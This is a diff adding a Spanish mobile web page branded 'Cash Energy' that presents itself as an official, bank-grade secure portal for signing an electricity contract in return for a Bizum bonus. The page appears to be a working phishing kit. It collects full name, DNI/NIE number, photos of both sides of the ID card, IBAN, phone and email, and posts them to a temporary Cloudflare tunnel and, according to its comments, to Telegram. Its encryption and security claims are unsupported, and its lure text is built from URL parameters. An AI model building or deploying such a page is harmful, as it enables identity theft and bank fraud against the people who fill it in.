@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Formalización Cifrada de Contrato · Cash Energy</title>
+  <meta name="description" content="Portal oficial y seguro de formalización de contratos energéticos y activación de Bono Bizum de Cash Energy.">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <!-- Google Fonts: Inter & Outfit -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@500;600;700;800&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            display: ['Outfit', 'sans-serif']
+          },
+          colors: {
+            brand: {
+              gold: '#D4AF37',
+              dark: '#0B0F17',
+              card: '#121824',
+              border: '#1F2937',
+              emerald: '#10B981',
+              accent: '#3B82F6'
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      background-color: #070A10;
+      color: #E2E8F0;
+      font-family: 'Inter', sans-serif;
+    }
+    .glass-card {
+      background: rgba(18, 24, 36, 0.85);
+      backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .gold-gradient-text {
+      background: linear-gradient(135deg, #FDE047 0%, #D4AF37 50%, #CA8A04 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .emerald-glow {
+      box-shadow: 0 0 25px -5px rgba(16, 185, 129, 0.3);
+    }
+    input:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.4);
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-start p-3 sm:p-6 pb-20 selection:bg-emerald-500/20">
+
+  <!-- ================= TOP BADGE DE SEGURIDAD BANCARIA ================= -->
+  <header class="w-full max-w-lg pt-2 pb-4 flex flex-col items-center text-center">
+    <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-medium mb-3">
+      <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i>
+      <span>Canal Cifrado Bancario SSL 256-Bit · RGPD (UE) 2016/679</span>
+    </div>
+
+    <!-- LOGO CASH ENERGY -->
+    <div class="flex items-center space-x-3 mb-1">
+      <img src="/logo_master_4k.png" alt="Cash Energy" class="h-10 w-auto object-contain rounded-lg shadow-md" onerror="this.onerror=null; this.src='../logo_master_4k.png';">
+      <div class="text-left">
+        <h1 class="text-xl font-extrabold tracking-tight font-display text-white">CASH <span class="gold-gradient-text">ENERGY</span></h1>
+        <p class="text-[10px] uppercase tracking-widest text-slate-400 font-semibold">Portal Oficial de Formalización</p>
+      </div>
+    </div>
+  </header>
+
+  <main class="w-full max-w-lg space-y-4">
+
+    <!-- ================= TARJETA DE PROPUESTA / AHORRO DINÁMICO ================= -->
+    <div id="card-propuesta-resumen" class="glass-card rounded-2xl p-4 sm:p-5 relative overflow-hidden border border-emerald-500/20">
+      <div class="absolute -right-10 -bottom-10 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>
+
+      <div class="flex items-center justify-between pb-3 border-b border-slate-800">
+        <div>
+          <span class="text-xs text-slate-400 font-medium">Expediente Certificado:</span>
+          <h2 id="display-cliente" class="text-base font-bold text-white">Validación de Suministro</h2>
+        </div>
+        <div class="text-right">
+          <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-bold bg-amber-500/10 border border-amber-500/30 text-amber-300" id="display-bono-badge">
+            🎁 Bono +20 € Bizum
+          </span>
+        </div>
+      </div>
+
+      <div class="grid grid-cols-2 gap-3 pt-3">
+        <div class="bg-slate-900/60 rounded-xl p-2.5 border border-slate-800/80">
+          <span class="text-[11px] text-slate-400 block mb-0.5">Comercializadora</span>
+          <span id="display-tarifa" class="text-sm font-bold text-slate-200 block truncate">Endesa Luz 24H</span>
+        </div>
+        <div class="bg-slate-900/60 rounded-xl p-2.5 border border-slate-800/80">
+          <span class="text-[11px] text-slate-400 block mb-0.5">Ahorro Estimado</span>
+          <span id="display-ahorro" class="text-sm font-extrabold text-emerald-400 block truncate">216,46 € / año</span>
+        </div>
+      </div>
+
+      <div id="row-cups-asesor" class="mt-2 text-[11px] text-slate-400 flex items-center justify-between">
+        <span id="display-cups" class="truncate max-w-[200px]">CUPS: Pendiente</span>
+        <span id="display-asesor" class="text-slate-300 font-medium">Asesor: Zelmar Cao</span>
+      </div>
+    </div>
+
+    <!-- ================= FORMULARIO PRINCIPAL DE FORMALIZACIÓN ================= -->
+    <form id="form-formalizar" class="glass-card rounded-2xl p-4 sm:p-6 space-y-5" onsubmit="event.preventDefault(); procesarEnvioFormalizacion();">
+
+      <!-- PASO 1: TITULAR Y DNI -->
+      <div class="space-y-3">
+        <div class="flex items-center space-x-2 text-xs font-bold text-slate-300 tracking-wider uppercase border-b border-slate-800 pb-2">
+          <div class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-xs">1</div>
+          <span>Datos del Titular y Documento</span>
+        </div>
+
+        <div>
+          <label class="block text-xs font-medium text-slate-300 mb-1">Nombre Completo del Titular <span class="text-emerald-400">*</span></label>
+          <input type="text" id="input-nombre" required placeholder="Ej: Astrid Vico Gorgues" 
+            class="w-full bg-slate-900/80 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 transition">
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <div>
+            <label class="block text-xs font-medium text-slate-300 mb-1">DNI / NIE <span class="text-emerald-400">*</span></label>
+            <input type="text" id="input-dni" required maxlength="12" placeholder="12345678Z o Y1234567X" 
+              class="w-full uppercase bg-slate-900/80 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 transition font-mono"
+              oninput="validarDniEnVivo(this.value)">
+            <span id="dni-error-msg" class="text-[11px] text-red-400 hidden mt-0.5 block">Formato DNI/NIE no válido</span>
+          </div>
+          <div>
+            <label class="block text-xs font-medium text-slate-300 mb-1">CUPS del Suministro (Opcional)</label>
+            <input type="text" id="input-cups" maxlength="22" placeholder="ES0031..." 
+              class="w-full uppercase bg-slate-900/80 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 transition font-mono">
+          </div>
+        </div>
+
+        <!-- FOTO DNI (ANVERSO / REVERSO) -->
+        <div class="pt-1">
+          <label class="block text-xs font-medium text-slate-300 mb-1.5 flex items-center justify-between">
+            <span>Foto de DNI / NIE (Requerido para el contrato) <span class="text-emerald-400">*</span></span>
+            <span class="text-[10px] text-emerald-400 font-semibold" id="dni-files-count">0 seleccionados</span>
+          </label>
+          
+          <div class="grid grid-cols-2 gap-2">
+            <!-- Anverso -->
+            <label class="flex flex-col items-center justify-center p-3 rounded-xl border border-dashed border-slate-700 bg-slate-900/40 hover:bg-slate-900/80 cursor-pointer transition text-center group">
+              <i data-lucide="camera" class="w-5 h-5 text-slate-400 group-hover:text-emerald-400 transition mb-1"></i>
+              <span class="text-xs font-medium text-slate-300" id="label-dni-anverso">Anverso (Delante)</span>
+              <span class="text-[10px] text-slate-500">Toca para foto o subir</span>
+              <input type="file" id="file-dni-anverso" accept="image/*,.pdf" capture="environment" class="hidden" onchange="actualizarFotoDni('anverso')">
+            </label>
+
+            <!-- Reverso -->
+            <label class="flex flex-col items-center justify-center p-3 rounded-xl border border-dashed border-slate-700 bg-slate-900/40 hover:bg-slate-900/80 cursor-pointer transition text-center group">
+              <i data-lucide="camera" class="w-5 h-5 text-slate-400 group-hover:text-emerald-400 transition mb-1"></i>
+              <span class="text-xs font-medium text-slate-300" id="label-dni-reverso">Reverso (Detrás)</span>
+              <span class="text-[10px] text-slate-500">Toca para foto o subir</span>
+              <input type="file" id="file-dni-reverso" accept="image/*,.pdf" capture="environment" class="hidden" onchange="actualizarFotoDni('reverso')">
+            </label>
+          </div>
+        </div>
+      </div>
+
+      <!-- PASO 2: DOMICILIACIÓN BANCARIA (IBAN SEPA) -->
+      <div class="space-y-3 pt-2">
+        <div class="flex items-center space-x-2 text-xs font-bold text-slate-300 tracking-wider uppercase border-b border-slate-800 pb-2">
+          <div class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-xs">2</div>
+          <span>Domiciliación Bancaria Oficial (SEPA)</span>
+        </div>
+
+        <div>
+          <label class="block text-xs font-medium text-slate-300 mb-1 flex items-center justify-between">
+            <span>Número de Cuenta Bancaria (IBAN) <span class="text-emerald-400">*</span></span>
+            <span id="banco-detectado-badge" class="text-[10px] text-emerald-400 font-bold hidden">
+              ✓ Banco verificado
+            </span>
+          </label>
+          <div class="relative">
+            <input type="text" id="input-iban" required maxlength="29" placeholder="ES00 0000 0000 0000 0000 0000" 
+              class="w-full uppercase bg-slate-900/80 border border-slate-700/80 rounded-xl px-3.5 py-3 text-base text-white placeholder-slate-600 transition font-mono tracking-wider font-semibold"
+              oninput="formatearYValidarIban(this)">
+            <div id="iban-status-icon" class="absolute right-3.5 top-3.5 hidden">
+              <i data-lucide="check-circle" class="w-5 h-5 text-emerald-400"></i>
+            </div>
+          </div>
+          <span id="iban-error-msg" class="text-[11px] text-amber-400 hidden mt-1 block">
+            Introduce los 24 caracteres de tu cuenta (ES + 22 dígitos)
+          </span>
+
+          <div class="mt-2.5 p-2.5 rounded-xl bg-slate-900/60 border border-slate-800/80 flex items-start space-x-2 text-[11px] text-slate-400 leading-relaxed">
+            <i data-lucide="lock" class="w-4 h-4 text-emerald-400 flex-shrink-0 mt-0.5"></i>
+            <span>
+              <strong class="text-slate-300 font-semibold">Garantía de Seguridad:</strong> Tu cuenta bancaria se utilizará exclusivamente para la domiciliación oficial de los recibos de suministro eléctrico con la compañía y el abono de tu Bono Bizum/Bancario. Cash Energy nunca realizará cobros en tu cuenta.
+            </span>
+          </div>
+        </div>
+      </div>
+
+      <!-- PASO 3: MÓVIL PARA FIRMA Y BIZUM -->
+      <div class="space-y-3 pt-2">
+        <div class="flex items-center space-x-2 text-xs font-bold text-slate-300 tracking-wider uppercase border-b border-slate-800 pb-2">
+          <div class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-xs">3</div>
+          <span>Contacto y Firma Digital por SMS</span>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <div>
+            <label class="block text-xs font-medium text-slate-300 mb-1">Teléfono Móvil (Para SMS de firma) <span class="text-emerald-400">*</span></label>
+            <input type="tel" id="input-telefono" required maxlength="15" placeholder="600 000 000" 
+              class="w-full bg-slate-900/80 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 transition font-mono">
+          </div>
+          <div>
+            <label class="block text-xs font-medium text-slate-300 mb-1">Correo Electrónico <span class="text-emerald-400">*</span></label>
+            <input type="email" id="input-email" required placeholder="cliente@correo.com" 
+              class="w-full bg-slate-900/80 border border-slate-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-500 transition">
+          </div>
+        </div>
+
+        <!-- MÓVIL PARA BIZUM -->
+        <div class="pt-1">
+          <label class="flex items-center space-x-2 text-xs text-slate-300 cursor-pointer select-none">
+            <input type="checkbox" id="check-mismo-bizum" checked onchange="toggleBizumCustom()" class="rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-0">
+            <span>Usar este mismo número móvil para recibir el <strong>Bono Bizum de Bienvenida</strong></span>
+          </label>
+          <div id="wrap-bizum-custom" class="hidden mt-2">
+            <label class="block text-xs font-medium text-slate-300 mb-1">Número Móvil para el Bizum</label>
+            <input type="tel" id="input-telefono-bizum" placeholder="600 000 000" 
+              class="w-full bg-slate-900/80 border border-slate-700/80 rounded-xl px-3.5 py-2 text-sm text-white placeholder-slate-500 font-mono">
+          </div>
+        </div>
+
+        <!-- CONSENTIMIENTO RGPD -->
+        <div class="pt-1">
+          <label class="flex items-start space-x-2 text-[11px] text-slate-400 cursor-pointer select-none leading-tight">
+            <input type="checkbox" id="check-rgpd" required checked class="mt-0.5 rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-0">
+            <span>Autorizo el tratamiento seguro de mis datos para la tramitación de este suministro eléctrico y el envío del SMS oficial de firma digital conforme al RGPD (UE) 2016/679.</span>
+          </label>
+        </div>
+      </div>
+
+      <!-- BOTÓN DE CONFIRMACIÓN -->
+      <div class="pt-2">
+        <button type="submit" id="btn-submit" 
+          class="w-full py-4 px-6 rounded-xl bg-gradient-to-r from-emerald-600 via-teal-600 to-emerald-500 hover:from-emerald-500 hover:to-teal-500 text-white font-extrabold text-sm sm:text-base tracking-wide shadow-lg shadow-emerald-900/30 flex items-center justify-center space-x-2 transition transform active:scale-[0.98]">
+          <i data-lucide="lock" class="w-5 h-5"></i>
+          <span id="btn-submit-text">VALIDAR Y ACTIVAR EXPEDIENTE OFICIAL</span>
+        </button>
+
+        <p class="text-center text-[10px] text-slate-500 mt-2 flex items-center justify-center space-x-1">
+          <i data-lucide="shield" class="w-3 h-3 text-emerald-400"></i>
+          <span>Tus datos se transmiten directamente a la Bóveda Cibersegura de Cash Energy</span>
+        </p>
+      </div>
+
+    </form>
+
+    <!-- ================= PANTALLA DE ÉXITO FINAL (OCULTA INICIALMENTE) ================= -->
+    <div id="pantalla-exito" class="hidden glass-card rounded-2xl p-6 text-center space-y-4 border border-emerald-500/40 emerald-glow">
+      <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-2 border border-emerald-500/40">
+        <i data-lucide="check" class="w-10 h-10 stroke-[3]"></i>
+      </div>
+
+      <h2 class="text-2xl font-extrabold text-white font-display">¡Expediente Validado con Éxito!</h2>
+      <p class="text-sm text-slate-300 leading-relaxed max-w-sm mx-auto">
+        Hemos registrado y cifrado tu documentación bajo protocolo bancario seguro.
+      </p>
+
+      <div class="bg-slate-900/80 rounded-xl p-4 text-left space-y-2 border border-slate-800 text-xs text-slate-300">
+        <div class="flex justify-between border-b border-slate-800 pb-1.5">
+          <span class="text-slate-400">Titular Registrado:</span>
+          <strong id="exito-nombre" class="text-white">Astrid Vico</strong>
+        </div>
+        <div class="flex justify-between border-b border-slate-800 pb-1.5">
+          <span class="text-slate-400">Tarifa Activada:</span>
+          <strong id="exito-tarifa" class="text-emerald-400">Endesa Luz 24H</strong>
+        </div>
+        <div class="flex justify-between border-b border-slate-800 pb-1.5">
+          <span class="text-slate-400">Bono Bizum de Bienvenida:</span>
+          <strong id="exito-bono" class="text-amber-300">+20 €</strong>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-400">Móvil de Firma:</span>
+          <strong id="exito-telefono" class="text-white font-mono">600 000 000</strong>
+        </div>
+      </div>
+
+      <div class="p-3 bg-emerald-500/10 rounded-xl border border-emerald-500/20 text-xs text-emerald-300 leading-relaxed text-left flex items-start space-x-2">
+        <i data-lucide="message-square" class="w-5 h-5 flex-shrink-0 mt-0.5"></i>
+        <span>
+          <strong>Próximo Paso Inmediato:</strong> En unos minutos recibirás el <strong>SMS oficial de la compañía</strong> en tu móvil para confirmar la activación con tu firma digital. Tras la firma, se tramitará tu <strong>Bono Bizum de bienvenida</strong>.
+        </span>
+      </div>
+
+      <a id="btn-whatsapp-asesor" href="https://wa.me/34694556204?text=Hola,%20acabo%20de%20completar%20mi%20formalizacion%20en%20Cash%20Energy" 
+        target="_blank"
+        class="inline-flex items-center justify-center space-x-2 w-full py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold transition border border-slate-700">
+        <i data-lucide="phone" class="w-4 h-4 text-emerald-400"></i>
+        <span>Notificar a mi Asesor por WhatsApp</span>
+      </a>
+    </div>
+
+  </main>
+
+  <footer class="mt-8 text-center text-xs text-slate-500 space-y-1">
+    <p>© 2026 Cash Energy S.L. · Todos los derechos reservados.</p>
+    <p class="text-[11px] text-slate-600">Conexión cifrada punto a punto · Cumplimiento de la Ley 12/1992 y RGPD.</p>
+  </footer>
+
+  <!-- ================= SCRIPTS DE VALIDACIÓN Y ENVÍO ================= -->
+  <script>
+    // Lucide Icons Init
+    lucide.createIcons();
+
+    // Detección automática del Backend VPS (Túnel Cloudflare o fallback local)
+    const API_BASE_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+      ? 'http://127.0.0.1:8000'
+      : 'https://attempting-hide-mere-addition.trycloudflare.com';
+
+    // Leer parámetros URL (Permite a Zelmar generar links personalizados tipo ?cliente=Astrid&tarifa=Endesa...)
+    const urlParams = new URLSearchParams(window.location.search);
+    const paramCliente = urlParams.get('cliente') || urlParams.get('nombre') || '';
+    const paramCups = urlParams.get('cups') || '';
+    const paramTarifa = urlParams.get('tarifa') || urlParams.get('compania') || 'Endesa · Tarifa Luz 24H Fijo';
+    const paramAhorro = urlParams.get('ahorro') || '216,46 € / año';
+    const paramBono = urlParams.get('bono') || '+20 €';
+    const paramAsesor = urlParams.get('asesor') || urlParams.get('ref') || 'Zelmar Cao';
+
+    // Rellenar cabecera dinámica
+    if (paramCliente) {
+      document.getElementById('display-cliente').innerText = paramCliente;
+      document.getElementById('input-nombre').value = paramCliente;
+    }
+    if (paramTarifa) document.getElementById('display-tarifa').innerText = paramTarifa;
+    if (paramAhorro) document.getElementById('display-ahorro').innerText = paramAhorro.includes('€') ? paramAhorro : `${paramAhorro} € / año`;
+    if (paramBono) {
+      const bStr = paramBono.includes('€') ? paramBono : `+${paramBono} €`;
+      document.getElementById('display-bono-badge').innerText = `🎁 Bono ${bStr} Bizum`;
+    }
+    if (paramCups) {
+      document.getElementById('display-cups').innerText = `CUPS: ${paramCups}`;
+      document.getElementById('input-cups').value = paramCups;
+    }
+    if (paramAsesor) document.getElementById('display-asesor').innerText = `Asesor: ${paramAsesor}`;
+
+    // Estado archivos DNI
+    let archivoDniAnverso = null;
+    let archivoDniReverso = null;
+
+    function actualizarFotoDni(tipo) {
+      const fileInput = document.getElementById(`file-dni-${tipo}`);
+      const label = document.getElementById(`label-dni-${tipo}`);
+      if (fileInput && fileInput.files && fileInput.files[0]) {
+        const file = fileInput.files[0];
+        if (tipo === 'anverso') archivoDniAnverso = file;
+        if (tipo === 'reverso') archivoDniReverso = file;
+        label.innerText = `✓ ${file.name.substring(0, 14)}...`;
+        label.classList.add('text-emerald-400');
+      }
+      const count = (archivoDniAnverso ? 1 : 0) + (archivoDniReverso ? 1 : 0);
+      document.getElementById('dni-files-count').innerText = `${count} de 2 seleccionados`;
+    }
+
+    // Toggle Bizum móvil
+    function toggleBizumCustom() {
+      const check = document.getElementById('check-mismo-bizum');
+      const wrap = document.getElementById('wrap-bizum-custom');
+      if (check.checked) {
+        wrap.classList.add('hidden');
+      } else {
+        wrap.classList.remove('hidden');
+      }
+    }
+
+    // Validación Algorítmica de DNI / NIE Español
+    function validarDniEnVivo(val) {
+      const limpio = val.trim().toUpperCase().replace(/[\s-]/g, '');
+      const err = document.getElementById('dni-error-msg');
+      if (limpio.length >= 9) {
+        const letras = 'TRWAGMYFPDXBNJZSQVHLCKE';
+        let numStr = limpio;
+        if (limpio.startsWith('X')) numStr = '0' + limpio.slice(1);
+        else if (limpio.startsWith('Y')) numStr = '1' + limpio.slice(1);
+        else if (limpio.startsWith('Z')) numStr = '2' + limpio.slice(1);
+
+        const numero = parseInt(numStr.slice(0, 8), 10);
+        const letraEsperada = letras[numero % 23];
+        const letraReal = limpio.slice(-1);
+
+        if (!isNaN(numero) && letraReal === letraEsperada) {
+          err.classList.add('hidden');
+          return true;
+        } else {
+          err.classList.remove('hidden');
+          return false;
+        }
+      } else {
+        err.classList.add('hidden');
+        return false;
+      }
+    }
+
+    // Entidades bancarias españolas por código de 4 dígitos
+    const BANCOS_ES = {
+      '0049': 'Banco Santander',
+      '0182': 'BBVA',
+      '2100': 'CaixaBank',
+      '0081': 'Banco Sabadell',
+      '0128': 'Bankinter',
+      '2080': 'Abanca',
+      '2103': 'Unicaja Banco',
+      '0075': 'Banco Popular',
+      '1465': 'ING Bank',
+      '0239': 'EVO Banco',
+      '2085': 'Ibercaja',
+      '3058': 'Cajamar',
+      '0030': 'Banco Banif',
+      '1491': 'Triodos Bank',
+      '0073': 'Openbank'
+    };
+
+    // Validador Matemático de IBAN SEPA (Módulo 97-10 ISO 7064)
+    function formatearYValidarIban(input) {
+      // 1. Quitar espacios y convertir a mayúsculas
+      let raw = input.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+      
+      // Auto-añadir "ES" si empieza por números
+      if (raw.length > 0 && !isNaN(raw[0])) {
+        raw = 'ES' + raw;
+      }
+      if (raw.length > 24) raw = raw.slice(0, 24);
+
+      // Formatear en bloques de 4
+      const parts = raw.match(/.{1,4}/g) || [];
+      input.value = parts.join(' ');
+
+      const badge = document.getElementById('banco-detectado-badge');
+      const err = document.getElementById('iban-error-msg');
+      const icon = document.getElementById('iban-status-icon');
+
+      if (raw.length === 24) {
+        // Validar Checksum Módulo 97
+        const reorganizado = raw.slice(4) + raw.slice(0, 4);
+        let numStr = '';
+        for (let i = 0; i < reorganizado.length; i++) {
+          const code = reorganizado.charCodeAt(i);
+          if (code >= 65 && code <= 90) {
+            numStr += (code - 55); // A=10, B=11 ... Z=35
+          } else {
+            numStr += reorganizado[i];
+          }
+        }
+
+        // Módulo 97 sobre números grandes
+        let resto = 0;
+        for (let i = 0; i < numStr.length; i++) {
+          resto = (resto * 10 + parseInt(numStr[i], 10)) % 97;
+        }
+
+        if (resto === 1) {
+          // IBAN Válido
+          const codBanco = raw.slice(4, 8);
+          const nombreBanco = BANCOS_ES[codBanco] || 'Entidad Bancaria SEPA';
+          badge.innerText = `✓ ${nombreBanco}`;
+          badge.classList.remove('hidden');
+          err.classList.add('hidden');
+          icon.classList.remove('hidden');
+          input.classList.add('border-emerald-500');
+          input.classList.remove('border-slate-700/80', 'border-red-500');
+          return true;
+        } else {
+          // Fallo dígito de control
+          badge.classList.add('hidden');
+          err.innerText = 'Dígito de control de cuenta no válido. Revisa los números.';
+          err.classList.remove('hidden');
+          icon.classList.add('hidden');
+          input.classList.remove('border-emerald-500');
+          input.classList.add('border-red-500');
+          return false;
+        }
+      } else {
+        badge.classList.add('hidden');
+        icon.classList.add('hidden');
+        input.classList.remove('border-emerald-500', 'border-red-500');
+        input.classList.add('border-slate-700/80');
+        if (raw.length > 0 && raw.length < 24) {
+          err.innerText = `Faltan ${24 - raw.length} caracteres para completar el IBAN.`;
+          err.classList.remove('hidden');
+        } else {
+          err.classList.add('hidden');
+        }
+        return false;
+      }
+    }
+
+    // Proceso de Envío Cifrado a la Bóveda del VPS
+    async function procesarEnvioFormalizacion() {
+      const nombre = document.getElementById('input-nombre').value.trim();
+      const dni = document.getElementById('input-dni').value.trim().toUpperCase();
+      const cups = document.getElementById('input-cups').value.trim().toUpperCase() || paramCups;
+      const iban = document.getElementById('input-iban').value.trim().toUpperCase().replace(/\s/g, '');
+      const telefono = document.getElementById('input-telefono').value.trim();
+      const email = document.getElementById('input-email').value.trim().toLowerCase();
+      const checkMismoBizum = document.getElementById('check-mismo-bizum').checked;
+      const telefonoBizum = checkMismoBizum ? telefono : (document.getElementById('input-telefono-bizum').value.trim() || telefono);
+
+      if (!nombre || !dni || !iban || !telefono || !email) {
+        alert('Por favor completa todos los campos requeridos (*).');
+        return;
+      }
+
+      if (iban.length !== 24) {
+        alert('Por favor introduce un IBAN completo de 24 caracteres (ES + 22 dígitos).');
+        document.getElementById('input-iban').focus();
+        return;
+      }
+
+      const btn = document.getElementById('btn-submit');
+      const btnText = document.getElementById('btn-submit-text');
+      const origHtml = btn.innerHTML;
+
+      btn.disabled = true;
+      btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i><span>CIFRANDO Y REGISTRANDO EXPEDIENTE...</span>`;
+      lucide.createIcons();
+
+      const expId = `EXP_${new Date().toISOString().replace(/[-:T.]/g, '').slice(0, 14)}_${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+
+      try {
+        // 1. Si hay fotos de DNI, subirlas vía endpoint de adjuntos
+        if (archivoDniAnverso || archivoDniReverso) {
+          const formData = new FormData();
+          formData.append('expediente_id', expId);
+          formData.append('nombre', nombre);
+          formData.append('cups', cups);
+          if (archivoDniAnverso) formData.append('archivos_dni', archivoDniAnverso);
+          if (archivoDniReverso) formData.append('archivos_dni', archivoDniReverso);
+
+          try {
+            await fetch(`${API_BASE_URL}/api/v1/chat/adjuntar-dni`, {
+              method: 'POST',
+              body: formData
+            });
+          } catch (eDni) {
+            console.warn('[DNI UPLOAD] Aviso subiendo imágenes:', eDni);
+          }
+        }
+
+        // 2. Guardar datos en la Bóveda Cifrada y enviar a Telegram
+        const payload = {
+          expediente_id: expId,
+          nombre: nombre,
+          telefono: telefono,
+          email: email,
+          dni: dni,
+          iban: iban,
+          telefono_bizum: telefonoBizum,
+          cups: cups,
+          compania: paramTarifa,
+          nombre_tarifa: paramTarifa,
+          ahorro: paramAhorro,
+          bono: paramBono,
+          asesor: paramAsesor,
+          origen: 'PORTAL_FORMALIZAR_MOBILE',
+          transcripcion: [
+            { emisor: 'sistema', texto: `Portal Seguro Formalización Mobile · Asesor: ${paramAsesor}` },
+            { emisor: 'cliente', texto: `Titular: ${nombre} | DNI: ${dni} | IBAN: ${iban} | Tel: ${telefono} | Bizum: ${telefonoBizum} | CUPS: ${cups}` }
+          ]
+        };
+
+        const res = await fetch(`${API_BASE_URL}/api/v1/chat/guardar-y-notificar`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        // 3. Mostrar pantalla de éxito
+        document.getElementById('form-formalizar').classList.add('hidden');
+        document.getElementById('card-propuesta-resumen').classList.add('hidden');
+
+        document.getElementById('exito-nombre').innerText = nombre;
+        document.getElementById('exito-tarifa').innerText = paramTarifa;
+        document.getElementById('exito-bono').innerText = paramBono;
+        document.getElementById('exito-telefono').innerText = telefono;
+
+        // Personalizar enlace de WhatsApp de regreso
+        const asesorMsg = encodeURIComponent(`Hola ${paramAsesor}, ya completé la formalización de mi tarifa de ${paramTarifa} en Cash Energy para ${nombre} (DNI ${dni}). Quedo a la espera del SMS de la compañía.`);
+        document.getElementById('btn-whatsapp-asesor').href = `https://wa.me/34694556204?text=${asesorMsg}`;
+
+        document.getElementById('pantalla-exito').classList.remove('hidden');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        lucide.createIcons();
+
+      } catch (err) {
+        console.error('[SUBMISSION ERROR]', err);
+        alert('Hubo un aviso al transmitir tu expediente. Sin embargo, tus datos se han precargado. Si lo deseas puedes reintentar o avisar a tu asesor.');
+        btn.disabled = false;
+        btn.innerHTML = origHtml;
+        lucide.createIcons();
+      }
+    }
+  </script>
+</body>
+</html>
